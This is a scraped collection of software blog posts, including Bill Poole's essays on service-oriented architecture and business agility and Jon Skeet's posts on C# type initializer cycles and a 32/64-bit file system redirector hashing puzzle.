actions performed and the roles that are responsible for those actions.<br /><br />It is through defining these lower level processes that we in fact are able to define the roles within the organisation and the responsibilities and KPIs for each role.  Armed with this, we are then in a position to determine the organisational structure - that is, the reporting relationships between the defined roles.<br /><br />This is illustrated below.<br /><br /><a href=\"http://bp2.blogger.com/_Ulehi1qz3j0/SJHUQCXnJ5I/AAAAAAAAADs/4GMAXXjxATE/s1600-h/Organisational+Structure+%26+Design.png\"><img style=\"display:block; margin:0px auto 10px; text-align:center;cursor:pointer; cursor:hand;\" src=\"http://bp2.blogger.com/_Ulehi1qz3j0/SJHUQCXnJ5I/AAAAAAAAADs/4GMAXXjxATE/s400/Organisational+Structure+%26+Design.png\" border=\"0\" alt=\"\"id=\"BLOGGER_PHOTO_ID_5229194014332757906\" /></a><br />As lower level processes change within an organisation, so may the roles and responsibilities and by extension the organisational structure.  This is further evidence of why we should model capabilities around business functions rather than organisational structure.  It provides a considerably more stable model.<br /><br />This activity of modelling the value chain has forced us to consider the entire business in a holistic and process centric way.  As such it is an excellent tool for identifying our top level process centric business capabilities that we can then use to define our business service model.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/9G_jUw0pPB4\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1300}}

The problem is that more often than not no explanation is given for what business agility actually<i>is</i>, why it is important, or how SOA contributes to achieving it.<br /><br />Firstly, it is important to note that business agility is a relative goal as opposed to an absolute one.  Even the most agile business can strive for greater agility.<br /><br />So what is business agility?  Business agility is the degree to which an organisation can effectively innovate and respond to market forces.<br /><br />In any given undertaking within an organisation, there are the traditional project management constraints of time, resource, scope and quality.  For a fixed scope if we wish to decrease time to delivery, we must increase resource or decrease quality.  For fixed resource if we wish to decrease time to delivery, we must decrease scope or quality.<br /><br />Note that scope refers to the amount of work that needs to be done to deliver the agreed outcome.  But as always, there is more than one way to skin a cat.  The business objectives targeted by the project can be met in any number of different ways.  A talented Solution Architect can design a solution to a business problem that requires less work to deliver.<br /><br />Really what we are talking about here is contrasting<i>business value</i>with<i>effort</i>.  If an organisation has a highly complex IT architecture that is very tightly coupled with a large number of interdependencies, then a change will take more<i>effort</i>to achieve, but deliver the same<i>business value</i>.<br /><br />In order to have an agile organisation, we must have the ability to enact change with less effort.  SOA helps simplify the IT architecture of an organisation by making systems more loosely coupled.  Of course, there are varying degrees of loose coupling with different SOA implementations.<br /><br />The SOA architectural style reduces coupling through message based interactions conforming to explicitly defined service contracts that encapsulate the implementation details of services away from consumers.  This gives us the ability to make changes to service implementations without impacting their consumers.<br /><br />We reduce coupling further by designing our services with appropriate<a href=\"http://bill-poole.blogspot.com/2008/04/service-granularity.html\">granularity and cohesion</a>, based on publish-subscribe messaging with<a href=\"http://bill-poole.blogspot.com/2008/07/service-contract-stability.html\">stable service contracts</a>.<br /><br />The IT architecture of an organisation however is only one piece of the business agility puzzle.  Once a business need has been identified, the business requirements must be extracted.  The speed, efficiency and accuracy with which this activity is performed also contribute to business agility.  There is very little business value in delivering a solution that doesn't meet the identified business objectives.<br /><br />Furthermore once we have extracted our business requirements, assuming they are accurate, we need to produce a solution architecture that meets those requirements.  So an organisation's proficiency in Solution Architecture is also significant here.<br /><br />We also want to ensure that as each solution is delivered, the complexity of the business and IT architecture is not adversely affected.  As such, we need the proper architecture governance processes in place to protect the broader enterprise architecture.<br /><br />It is important to strike the right balance with governance however.  Inefficient governance processes slow the rate at which projects can be delivered, thus harming business agility.  Insufficient governance however will result in the gradual increase of architectural complexity, thus harming business agility in the long run.<br /><br />Simply developing an effective solution architecture is still not enough.  We must of course then go about implementing the solution.  Here, the effectiveness of the organisation's project and programme management function is relevant, as well as the proficiency of the people that build and deploy the solution.<br /><br />And finally once the solution is ready to deploy, there must be effective change management processes in place to ensure that affected workers are properly trained and informed to support the change.  If the solution is not embraced by the people it affects, then the change will be ineffective.<br /><br />So why all the fuss about business agility?  Simply put, an organisation that doesn't respond to its changing environment will eventually become uncompetitive.  Granted that some industries are more volatile than others, however all business environments change over time.  Those businesses that are able to embrace this change in order to generate competitive advantage will be more successful.<br /><br />Innovation is also a key consideration in generating competitive advantage.  The ability to be able to take an idea and turn it into reality in less time, with less cost and lower risk certainly generates competitive advantage.<br /><br />So in conclusion, SOA as a style of architecture<i>contributes</i>towards business agility through reduction of enterprise architectural complexity, but by no means guarantees it.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/NTVjotOGZA8\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1301}}

Let me begin by saying this is simply not the case.  Platform independence in the context of SOA has two connotations:<br /><br />1. Services can be hosted on any platform (Windows, Linux, .NET, Java, etc)<br />2. Services are interoperable regardless of the platforms on which they are hosted<br /><br />Firstly, let us examine what a service is from a technical standpoint.  A service is an autonomous coarse grained unit of logic which external parties can communicate by way of exchanging explicitly defined messages via its endpoints.  The messages and endpoints are described by the service contract.  Consumers must conform to policies stipulated by a service provider in order to consume the service.<br /><br />Based on the above definition, any platform that can host a process that can exchange messages over a network is capable of hosting a service.  This is not a miracle of SOA, it is simply the miracle of distributed computing which was around long before the emergence of SOA.<br /><br />The second thing to note about the above definition is that it does not mandate any specific<i>transport</i>or<i>encoding</i>of messages.  Messages do<i>not</i>have to be encoded in XML.  They do<i>not</i>have to be transported over HTTP.  Service contracts do<i>not</i>have to be specified in WSDL.  Services<i>do not have to be natively interoperable</i>.<br /><br />Now it is true that Web service technologies greatly improve service interoperability between platforms.  But services in our SOA do not have to be Web services.  Even Web services by today's definition do not mandate that messages are transported over HTTP.  It is quite acceptable for a Web service to be exposed over a JMS or MSMQ transport.  JMS and MSMQ are<i>not</i>natively interoperable.<br /><br />It is also true that an intermediary such as an ESB can provide protocol translation which can make services that exchange messages with incompatible transports and encodings interoperable.  But again, an ESB is<i>not</i>a prerequisite for SOA.<br /><br />I guess the commonly held view that SOA and platform independence go hand in hand has emerged from the association between SOA and Web services.  But once again just to set the record straight, SOA does not mandate platform independence.<br /><br />SOA<i>does</i>however mandate that implementation details of a service are encapsulated behind the service contract.  As such, SOA certainly makes platform independence easier to achieve.  We just need to overcome any incompatibilities in message transport and encoding.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/COA5WXccvL8\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1303}}

What I did not explain however is<i>why</i>queues and topics are essential for supporting transactional services.<br /><br />Queues and topics are necessary to support transactional services because that both types of transports queue messages while they await delivery.  Although the transport may not store messages durably, they are still stored somewhere until they are delivered.  Neither the sender nor receiver holds onto the message during its transport.<br /><br />So, would it be possible to implement transactional services using a non-queued transport?  For example, let us assume we wanted to use WS-AtomicTransaction (WS-AT) over an HTTP transport.  As it turns out, it is not possible to achieve this without spanning the distributed transaction across your service boundaries.  As we all know, spanning transactions across service boundaries is not a good idea as it hurts performance and reliability.<br /><br />The reason for this is that with queued transports, messages are delivered to the receiver using a pull based mechanism. Messages are first pushed to the receiving queue, after which they wait to be read by the receiver at a later time.  This means that the sending service can complete and commit its transaction without concerning itself with the success or failure of the receiving service.<br /><br />Moreover, queued transports will cache the outbound message locally making the availability of the receiver irrelevant in committing the local transaction.  Without this mechanism for storing messages as they are transported between services, the successful transport of the message as well as the successful execution of the operation at the receiver become relevant as to whether the local transaction can be committed at the sender.<br /><br />Consequently, the sender must<i>wait</i>for a response from the receiver before committing the transaction - during which time local resources will likely be locked as part of the local transaction.<br /><br />So although transactional services are an incredibly powerful tool in service design, they do unfortunately require the use of a queued transport.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/Isfq9MlkoVg\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1304}}

Here's what the spec (section 10.5.5.1 of the C# 4 version):</p><blockquote><p>The static field variable initializers of a class correspond to a sequence of assignments that are executed in the textual order in which they appear in the class declaration. If a static constructor (§10.12) exists in the class, execution of the static field initializers occurs immediately prior to executing that static constructor. Otherwise, the static field initializers are executed at an implementation-dependent time prior to the first use of a static field of that class.</p></blockquote><p>In addition to the language specification, the CLI specification gives more details about type initialization in the face of circular dependencies and multiple threads. I won't post the details here, but the gist of it is:</p><ul><li>Type initialization acts like a lock, to prevent more than one thread from initializing a type</li><li>If the CLI notices that type A needs to be initialized in order to make progress, but it's<em>already in the process</em>of initializing type A<em>in the same thread</em>, it continues as if the type were already initialized.</li></ul><p>So here's what you<em>might</em>expect to happen:</p><ol><li>Initialize Test: no further action required</li><li>Start running Main</li><li>Start initializing First (as we need First.Beta)</li><li>Set First.Alpha to 5</li><li>Start initializing Second (as we need Second.Gamma)</li><li>Set Second.Gamma to First.Alpha (5)</li><li>End initializing Second</li><li>Set First.Beta to Second.Gamma (5)</li><li>End initializing First</li><li>Print 5</li></ol><p>Here's what<em>actually</em>happens - on my box, running .NET 4.5 beta. (I know that<a href=\"https://msmvps.com/blogs/jon_skeet/archive/2010/01/26/type-initialization-changes-in-net-4-0.aspx\">type initialization changed for .NET 4</a>, for example. I don't<em>know</em>of any changes for .NET 4.5, but I'm not going to claim it's impossible.)</p><ol><li>Initialize Test: no further action required</li><li>Start running Main</li><li>Start initializing First (as we need First.Beta)</li><li>Start initializing Second (we<em>will</em>need Second.Gamma)</li><li>Set Second.Gamma to First.Alpha (0)</li><li>End initializing Second</li><li>Set First.Alpha to 5</li><li>Set First.Beta to Second.Gamma (0)</li><li>End initializing First</li><li>Print 0</li></ol><p>Step 5 is the interesting one here. We know that we need First to be initialized, in order to get First.Alpha, but this thread is<em>already</em>initializing First (we started in step 3) so we just access First.Alpha and hope that it's got the right value. As it happens, that variable initializer hasn't been executed yet. Oops.</p><p>(One subtlety here is that I<em>could</em>have declared all these variables as constants instead using\"const\" which would have avoided all these problems.)</p><h1>Back in the real world...</h1><p>Hopefully that example makes it clear why circular dependencies in type initializers are nasty. They're hard to spot, hard to debug, and hard to test. Pretty much your classic<a href=\"http://en.wikipedia.org/wiki/Heisenbug\">Heisenbug</a>, really. It's important to note that if the program above had<em>happened</em>to initialize Second first (to access a different variable, for example) we could have ended up with a different result. In particular, it's easy to get into a situation where running<em>all</em>your unit tests can cause a failure - but if you run<em>just</em>the failing test, it passes.</p><p>One way of avoiding all of this is never to use any type initializers for anything, of course. In many cases that's exactly the right solution - but often there<em>are</em>natural uses, particularly for well-known values such as<a href=\"http://msdn.microsoft.com/en-us/library/system.text.encoding.utf8.aspx\">Encoding.Utf8</a>,<a href=\"http://msdn.microsoft.com/en-us/library/system.timezoneinfo.utc.aspx\">TimeZoneInfo.Utc</a>and the like. Note that in both of those cases they are static<em>properties</em>, but I would expect them to be backed by static fields. I'm somewhat ambivalent between using public static readonly fields and public static get-only properties - but as we'll see later, there's a definite advantage to using properties.</p><p><a href=\"http://noda-time.googlecode.com\">Noda Time</a>has quite a few values like this - partly because so many of its types are immutable. It makes sense to create a single UTC time zone, a single ISO calendar system, a single\"pattern\" (text formatter/parser) for each of a variety of common cases. In addition to the publicly visible values, there are various static variables used internally, mostly for caching purposes. All of this definitely adds complexity -<em>and</em>makes it harder to test - but the performance benefits can be significant.</p><p>Unfortunately, a lot of these values end up with fairly natural circular dependencies - as I discovered just recently, where adding a new static field caused all kinds of breakage. I was able to fix the immediate cause, but it left me concerned about the integrity of the code. I'd fixed the one failure I knew about - but what about any others?</p><h1>Testing type initialization</h1><p>One of the biggest issues with type initialization is the order-sensitivity - combined with the way that once a type has been initialized once, that's it for that AppDomain. As I showed earlier, it's possible that initializing types in one particular order causes a problem, but a different order won't.</p><p>I've decided that for Noda Time at least, I want to be reasonably sure that type initialization circularity isn't going to bite me. So I want to validate that no type initializers form cycles, whatever order the types are initialized in. Logically if we can detect a cycle starting with one type, we<em>ought</em>to be able to detect it starting with any of the other types in that cycle - but I'm sufficiently concerned about weird corner cases that I'd rather just take a brute force approach.</p><p>So, as a rough plan:</p><ul><li>Start with an empty set of dependencies</li><li>For each type in the target assembly:<ul><li>Create a new AppDomain</li><li>Load the target assembly into it</li><li>Force the type to be initialized</li><li>Take a stack trace at the start of each type initializer and record any dependencies</li></ul></li><li>Look for cycles in the complete set of dependencies</li></ul><p>Note that we'll never spot a cycle within any single AppDomain, due to the way that type initialization works. We have to put together the results for multiple initialization sequences to try to find a cycle.</p><p>A description of the code would probably be harder to follow than the code itself, but the code is relatively long - I've included it at the end of this post to avoid intefering with the narrative flow. For more up-to-date versions in the future, look at the<a href=\"http://code.google.com/p/noda-time/source/browse/\">Noda Time repository</a>.</p><p>This<em>isn't</em>a terribly nice solution, for various reasons:</p><ul><li>Creating a new AppDomain and loading assemblies into it<em>from a unit test runner</em>isn't as simple as it might be. My code doesn't currently work with NCrunch; I don't know how it finds its assemblies yet. When I've fixed that, I'm sure other test runners would still be broken. Likewise I've had to explicitly filter types to get TeamCity (the continuous integration system Noda Time uses) to work properly. Currently, you'd need to edit the test code to change the filters. (It's possible that there are better ways of filtering, of course.)</li><li>It relies on each type within the production code which has an\"interesting\" type initializer to have a line like this:<div class=\"code\"><span class=\"Modifier\">private</span> <span class=\"Modifier\">static</span> <span class=\"Modifier\">readonly</span> <span class=\"ValueType\">int</span>TypeInitializationChecking = NodaTime.Utility.TypeInitializationChecker.RecordInitializationStart();</div></li><li>Not only does the previous line need to be added to the production code - it clearly gets executed each time, and takes up heap space per type. It's only 4 bytes for each type involved, and it does no real work when we're not testing, but it's a nuisance anyway. I<em>could</em>use preprocessor directives to remove the code from non-debug or non-test-targeted builds, but that would look even messier.</li><li>It only picks up cycles which occur when running the version of .NET the tests happen to execute on. Given that there are ordering changes for different versions, I wouldn't like to claim this is 100% bullet-proof. Likewise if there are only cycles when you're running in some specific cultures (or other environmental features), it won't necessarily pick those up.</li><li>I've deliberately not tried to make the testing code thread-safe. That's fine in Noda Time - I don't have any asynchronous operations or new threads in Noda Time at all - but other code may need to make this more robust.</li></ul><p>So with all these caveats, is it still worth it? Absolutely:<strong>it's already found bugs which have now been fixed</strong>.</p><p>In fact, the test didn't get as far as reporting cycles to start with - it turned out that if you initialized one particular type first, the type initializer would fail with a NullReferenceException. Ouch! Once I'd fixed that, there were still quite a few problems to fix. Somewhat coincidentally, fixing them improved the design too - although the user-visible API didn't change at all.</p><h1>Fixing type initializer cycles</h1><p>In the past, I've occasionally\"fixed\" type initialization ordering problems by simply moving fields around. The cycles still existed, but I figured out how to make them harmless. I can say now that<em>this approach does not scale, and is more effort than it's worth</em>. The code ends up being brittle, hard to think about, and once you've got more than a couple of types involved it's really error-prone, at least for my brain. It's much better to break the cycle completely. To this end, I've ended up using a fairly simple technique to defer initialization of static variables. It's a poor-man's<a href=\"http://msdn.microsoft.com/en-us/library/dd642331.aspx\">Lazy&lt;T&gt;</a>, to some extent - but I'd rather not have to write Lazy&lt;T&gt; myself, and we're currently targeting .NET 3.5...</p><p>Basically, instead of exposing a public static readonly field which creates the cycle, you expose a public static readonly property - which returns an internal static readonly field<em>in a nested, private static class</em>. We still get the nice thread-safe once-only initialization of a type initializer, but the nested type won't be initialized until it needs to be. (In theory it<em>could</em>be initialized earlier, but a static constructor would ensure it isn't.) So long as nothing within the<em>rest</em>of the type initializer for the containing class uses that property, we avoid the cycle.</p><p>So instead of this:</p><div class=\"code\"><span class=\"InlineComment\">// Requires Bar to be initialized - if Bar also requires Foo to be</span><br /><span class=\"InlineComment\">// initialized, we have a problem...</span><br /><span class=\"Modifier\">public</span> <span class=\"Modifier\">static</span> <span class=\"Modifier\">readonly</span>Foo SimpleFoo =<span class=\"Keyword\">new</span>Foo(Bar.Zero);</div><p>We might have:</p><div class=\"code\"><span class=\"Modifier\">public</span> <span class=\"Modifier\">static</span> <span class=\"Modifier\">readonly</span>Foo SimpleFoo { get {<span class=\"Statement\">return</span>Constants.SimpleFoo; } }<br /><br /><span class=\"Modifier\">private</span> <span class=\"Modifier\">static</span> <span class=\"ReferenceType\">class</span>Constants<br />{<br />   <span class=\"Modifier\">private</span> <span class=\"Modifier\">static</span> <span class=\"Modifier\">readonly</span> <span class=\"ValueType\">int</span>TypeInitializationChecking = NodaTime.Utility.TypeInitializationChecker.RecordInitializationStart(); <br /><br />   <span class=\"InlineComment\">// This requires both Foo and Bar to be initialized, but that's okay</span><br />   <span class=\"InlineComment\">// so long as neither of them require Foo.Constants to be initialized.</span><br />   <span class=\"InlineComment\">// (The unit test would spot that.)</span><br />   <span class=\"Modifier\">internal</span> <span class=\"Modifier\">static</span> <span class=\"Modifier\">readonly</span>Foo SimpleFoo =<span class=\"Keyword\">new</span>Foo(Bar.Zero);<br />}</div><p>I'm currently undecided about whether to include static constructors in these classes to ensure lazy initialization. If the type initializer for Foo triggered the initializer of Foo.Constants, we'd be back to square one... but adding static constructors into each of these nested classes sounds like a bit of a pain. The nested classes should call into the type initialization checking as well, to validate they don't cause any problems themselves.</p><h1>Conclusion</h1><p>I have to say, part of me really doesn't like either the testing code or the workaround. Both smack of being<em>clever</em>, which is never a good thing. It's definitely worth considering whether you could actually just get rid of the type initializer (or part of it) entirely, avoiding maintaining so much static state. It would be nice to be able to detect these type initializer cycles without running anything, simply using static analysis - I'm going to see whether NDepend could do that when I get a chance. The workaround doesn't feel as neat as Lazy&lt;T&gt;, which is<em>really</em>what's called for here - but I don't trust myself to implement it correctly and efficiently myself.</p><p>So while both are somewhat hacky, they're better than the alternative: buggy code. That's what I'm ashamed to say I had in Noda Time, and I don't think I'd<em>ever</em>have spotted all the cycles by inspection. It's worth a try on your own code - see whether you've got problems lurking...</p><p> </p><p> </p><h1>Appendix: Testing code</h1><p>As promised earlier, here's the code for the production and test classes.</p><h2>TypeInitializationChecker</h2><p>This is in NodaTime.dll itself.</p><div class=\"code\"><span class=\"Modifier\">internal</span> <span class=\"Modifier\">sealed</span> <span class=\"ReferenceType\">class</span>TypeInitializationChecker : MarshalByRefObject<br />{<br />   <span class=\"Modifier\">private</span> <span class=\"Modifier\">static</span>List&lt;Dependency&gt;

I solved it, tweeted it, but then thought it would serve as a useful case study into the mental processes I go through when trying to solve a problem - whether that's on Stack Overflow, at work, or at home.</p><p>It's definitely worth reading the original question, but the executive summary is:</p><blockquote><p>When I compute the checksum/hash of c:\\Windows\\System32\\Calc.exe using various tools and algorithms, those tools all give the same answer for each algorithm. When I try doing the same thing in Java, I get different results. What's going on?</p></blockquote><p>Now to start with, I'd like to shower a bit of praise on the author:</p><ul><li>The post came with a short but utterly complete program to demonstrate the problem</li><li>The comments in the program showed the expected values and the actual values</li><li>The code was mostly pretty clean (clean enough for an SO post anyway)</li></ul><p>In short, it had pretty much<a href=\"http://tinyurl.com/so-hints\">everything I ask for in a question</a>. Yay! Additionally, the result seemed to be strange. The chances of any one of Java's hashing algorithms being broken seem pretty slim, but<em>four</em>of them? Okay, now you've got me interested.</p><h3>Reproducing the problem</h3><p>Unless I can spot the error immediately, I usually try to reproduce the problem in a Stack Overflow post with a short but complete program. In this case, the program was already provided, so it was just a matter of copy/paste/compile/run. This one had the additional tweak that it was comparing the results of Java with the results of other tools, so I had to get hold of an MD5 sum tool first. (I chose to start with MD5 for no particular reason.) I happened to pick<a href=\"http://www.pc-tools.net/win32/md5sums/\">this one</a>, but it didn't really seem it would make much difference. (As it happens, that was an incorrect assumption, but hey...)</p><p>I ran md5sums on c:\\Windows\\System32\\calc.exe, and got the same result as the poster. Handy.</p><p>I then ran the Java code, and again got the same result as the poster: step complete, we have a discrepancy between at least one tool (and MD5 isn't that hard to get right) and Java.</p><p><strong>Looking for obvious problems</strong></p><p>The code has four main areas:</p><ul><li>Reading a file</li><li>Updating digests</li><li>Converting bytes to hex</li><li>Storing and displaying results</li></ul><p>Of these, all of the first three have common and fairly simple error modes. For example:</p><ul><li>Failure to use the return value from InputStream.read()</li><li>Failure to update the digests using only the relevant portion of the data buffer</li><li>Failure to cope with Java's signed bytes</li></ul><p>The code for storing and displaying results seemed solid enough to ignore to start with, and brief inspection suggested that the first two failure modes had been avoided. While the hex code didn't have any<em>obvious</em>problems either, it made sense to check it. I simply printed the result of hard-coding the\"known good\" CRC-32 value:</p><div class=\"code\">System.out.println(toHex(<span class=\"Keyword\">new</span> <span class=\"Type\">byte</span>[] {<br />    (<span class=\"Type\">byte</span>) 0x8D, (<span class=\"Type\">byte</span>) 0x8F, (<span class=\"Type\">byte</span>) 0x5F, (<span class=\"Type\">byte</span>) 0x8E<br />  }));</div><p>That produced the right result, so I ruled out that part of the code too. Even if it had errors in some cases, we know it's capable of producing the right string for one of the values we know we<em>should</em>be returning, so it can't be getting that value.</p><h3>Initial checks around the file</h3><p>I'm always suspicious of stream-handling code - or rather, I know how easily it can hide subtle bugs. Even though it<em>looked</em>okay, I thought I'd check - so I added a simple total to the code so I could see how many bytes had been hashed. I also removed all the hash algorithms other than MD5, just for simplicity:</p><div class=\"code\">MessageDigest md5 = MessageDigest.getInstance(<span class=\"String\">\"MD5\"</span>);<br /><br />FileInputStream fis =<span class=\"Keyword\">new</span>FileInputStream(file);<br /><span class=\"Type\">byte</span>data[] =<span class=\"Keyword\">new</span> <span class=\"Type\">byte</span>[size];<br /><span class=\"Type\">int</span>len = 0;<br /><span class=\"Type\">int</span>total = 0;<br /><span class=\"Statement\">while</span>((len = fis.read(data)) != -1) {<br />    md5.update(data, 0, len);<br />    total += len;<br />}<br />fis.close();<br />System.out.println(<span class=\"String\">\"Total bytes read:\"</span>+ total);<br /><br />results.put(md5.getAlgorithm(), toHex(md5.digest()));</div><p>It's worth noting that I<em>haven't</em>tried to fix up bits of the code which I know I would change if I were actually doing a code review:</p><ul><li>The stream isn't being closed in a finally block, so we'll have a dangling resource (until GC) if an IOException is thrown</li><li>The initial value of len is never read, and can be removed</li></ul><p>Neither of these matters in terms of the problem at hand, and closing the file\"properly\" would make the sample code more complicated. (For the sake of just a short sample program, I'd be tempted to remove it entirely.)</p><p>The result showed the number of bytes being read as the command prompt did when I ran\"dir c:\\Windows\\System32\\Calc.exe\" - so again, everything looks like it's okay.</p><h3>Desperate times call for stupid measures</h3><p>Just on a whim, I decided to copy Calc.exe to a local folder (the current directory) and retry. After all, accessing a file in a system folder<em>might</em>have some odd notions applied to it. It's hard to work out what, but... there's nothing to lose just by trying a simple test. If it can rule<em>anything</em>out, and you've got no better ideas, you might as well try even the daftest idea.</p><p>I modified the source code to use the freshly-copied file, and it gave the same result. Hmm.</p><p>I then reran md5sums on the copied file... and it gave<em>the same result as Java</em>. In other words, running\"md5sums c:\\Windows\\System32\\Calc.exe\" gave one result, but\"md5sums CopyOfCalc.exe\" gave a different result. At this point we've moved from<em>Java</em>looking like it's behaving weirdly to<em>md5sums</em>looking suspicious.</p><h3>Proving the root cause</h3><p>At this point we're<em>sort of</em>done - we've basically proved that the Java code produces the right hash for whatever data it's given, but we're left with the question of what's happening on the file system. I had a hunch that it might be something to do with x86 vs x64 code (all of this was running on a 64-bit version of Windows 7) - so how do we test that assumption?</p><p>I don't know if there's a simple way of running an x86 version of the JVM, but I<em>do</em>know how to switch .NET code between x86 and x64 - you can do that for an assembly at build time. C# also makes the hashing and hex conversion simple, so I was able to knock up a very small app to show the problem:</p><div class=\"code\"><span class=\"Namespace\">using</span>System;<br /><span class=\"Namespace\">using</span>System.IO;<br /><span class=\"Namespace\">using</span>System.Security.Cryptography;<br /><br /><span class=\"ReferenceType\">class</span>Test<br />{<br />   <span class=\"Modifier\">static</span> <span class=\"ValueType\">void</span>Main()<br />    {<br />       <span class=\"Namespace\">using</span>(<span class=\"Linq\">var</span>md5 = MD5.Create())<br />        {<br />           <span class=\"ReferenceType\">string</span>path =<span class=\"String\">\"c:/Windows/System32/Calc.exe\"</span>;<br />           <span class=\"Linq\">var</span>bytes = md5.ComputeHash(File.ReadAllBytes(path));<br />            Console.WriteLine(BitConverter.ToString(bytes));<br />        }<br />    }<br />}</div><p>(For a larger file I'd have used File.OpenRead instead, but then I'd have wanted to close the stream afterwards. Somehow it wasn't worth correcting the<em>existing</em>possible handle leak in the Java code, but I didn't want to write leaky code myself. So instead I've got code which reads the whole file into memory unnecessarily...&lt;sigh&gt;)</p><p>You can choose the architecture to build against (usually AnyCPU, x86 or x64 - though it's interesting to see that\"arm\" is also an option under .NET 4.5, for obvious reasons) either from Visual Studio or using the\"/platform\" command line option. This doesn't change the IL emitted (as far as I'm aware) but it's used for interop with native code - and in the case of executables, it also determines the version of the CLR which is used.</p><p>Building and running in x86 mode gave the same answer as the original\"assumed to be good\" tools; building and running in x64 mode gave the same answer as Java.</p><h3>Explaining the root cause</h3><p>At this point we've proved that the file system gives different results depending on whether you access it from a 64-bit process or a 32-bit process. The<em>final</em>piece of the puzzle was to find some something to explain why that happens. With all the evidence about what's happening, it was now easy to search for more information, and I found<a href=\"http://www.samlogic.net/articles/32-64-bit-windows-folder-x86-syswow64.htm\">this article</a>giving satisfactory details. Basically, there are two different copies of the system executables on a 64 bit system: x86 ones which run under the 32-bit emulator, and x64 ones. They're actually in different directories, but when a process opens a file in \\Windows\\System32, the copy which matches the architecture of the process is used. It's almost as if the \\Windows\\System32 directory is a symlink which changes target depending on the current process.</p><p>A Stack Overflow comment on my answer gave a final nugget that this is called the\"File System Redirector\".</p><h3>Conclusion</h3><p>Debugging sessions often feel a bit like this - particularly if you're like me, and only resort to<em>real</em>debugging after unit testing has failed. It's a matter of looking under all kinds of rocks, trying anything and everything, but keeping track of everything you try. At the end of process you should be able to explain<em>every</em>result you've seen, in an ideal world. (You may not be able to give evidence of the actual chain of events, but you should be able to construct a plausible chain of events which concurs with your theory.)</p><p>Be aware of areas which can<em>often</em>lead to problems, and check those first, gradually reducing the scope of\"stuff you don't understand\" to a manageable level, until it disappears completely.</p><div style=\"clear:both;\"></div><img src=\"http://msmvps.com/aggbug.aspx?PostID=1807429\" width=\"1\" height=\"1\"><img src=\"http://feeds.feedburner.com/~r/JonSkeetCodingBlog/~4/CIaupaq9SkE\" height=\"1\" width=\"1\"/>","author":"skeet","_id":{"$wrap":"$oid","v":1306}}

In this post, we're going to dig a bit deeper into the elements that make up a service.  These elements are illustrated below.<br /><br /><a href=\"http://2.bp.blogspot.com/_Ulehi1qz3j0/SPyoyjgJgxI/AAAAAAAAAEU/0svYzvvNtIU/s1600-h/Service+Elements.png\"><img style=\"display:block; margin:0px auto 10px; text-align:center;cursor:pointer; cursor:hand;\" src=\"http://2.bp.blogspot.com/_Ulehi1qz3j0/SPyoyjgJgxI/AAAAAAAAAEU/0svYzvvNtIU/s400/Service+Elements.png\" border=\"0\" alt=\"\"id=\"BLOGGER_PHOTO_ID_5259264051338904338\" /></a><br />Note that the illustration above doesn't imply any kind of layering.  There are three types of service elements depicted.  The yellow elements are related to the service domain.  This is the logic, information model and state that drives the behaviour of the service relative to the responsibilities it holds in the overall architecture.<br /><br />The green elements relate to the service boundary.  The service contract describes the messages managed by the service and the endpoints through which the messages are exchanged.<br /><br />The blue elements are service resources.  Note that the service contains human resources.  This is because service logic may in part be executed by people.  This is explained in more detail<a href=\"http://bill-poole.blogspot.com/2008/03/are-there-people-in-my-service.html\">here</a>.  This is a very important point.  Most discussions around SOA tend to describe services only as IT constructs.  A service consumer is unaware and does not care whether the service functionality is provided by people at a keyboard or software running on a server.<br /><br />In addition to the human resources, a service also will very likely contain software and hardware infrastructure.  The hardware infrastructure refers to the physical hardware on which the service operates - e.g. servers, SANs and communication infrastructure.<br /><br />The software infrastructure refers to software that supports the operation of the service, but doesn't implement the logic defined within the service domain.  So for example, this software would include operating systems, application platforms and communication software.<br /><br />The distinction between software infrastructure and service domain logic is an important one.  Software infrastructure can be reused between services, whereas logic related to the service domain should not be.  Domain logic should be implemented and deployed only once in one service.  Why?  Because otherwise we have low cohesion - a single concern addressed by multiple services - and that leads to coupling between services.<br /><br />So why can we reuse software infrastructure between services?  This is because such software is generic.  It doesn't pertain to any specific service domain.  Take UI rendering logic for instance.  The logic required for rendering a window doesn't relate to any specific domain addressed by any service in your business.<br /><br />Other examples of software infrastructure include rules engines and workflow systems.  However the rules and workflows themselves<i>would</i>constitute service domain logic.<br /><br />An interesting example is a CRM package.  A CRM package comes with quite a lot of what would seem to be domain logic.  For example, a CRM may be deployed in support of the Sales function of a business without a great deal of customisation.  Here, a large number of the native application features will directly contribute to the service domain.<br /><br />A CRM package does not however need to deal only with customers.  Most CRM packages can be highly customised to hold custom entities with complex relationships.  Custom logic can be added to the CRM package to implement specific business rules around these entities.  In this case the CRM package is being leveraged as an application platform, and as such is not implementing the domain logic of the service.<br /><br />Okay last but not least, we need to discuss the service information model and state.  Pretty much every service will have state.  That state will conform to the service information model and the service domain logic executes against that information model.  To that end, the service information model, state and domain logic are all indelibly linked.<br /><br />Note that any state leveraged by the software infrastructure is considered part of the infrastructure itself and not part of the service state in the above illustration.<br /><br />Just like service domain logic, the service state and information model should not be shared between services as it introduces coupling.  Services should share data only by way of message exchange, although this is not always possible when transforming an enterprise full of legacy applications to an SOA - at least initially; but more on that in a future post.<br /><br />So everything in blue in the above illustration is reusable between services.  The same people can participate in many services, and the same software and hardware infrastructure is reusable between services.  Everything else should not be directly reused as it introduces coupling and reduces cohesion.  Of course, domain logic within one service can be reused by other services through exchanging messages with that service.<br /><br />Okay well that sums up the basic elements of a service.

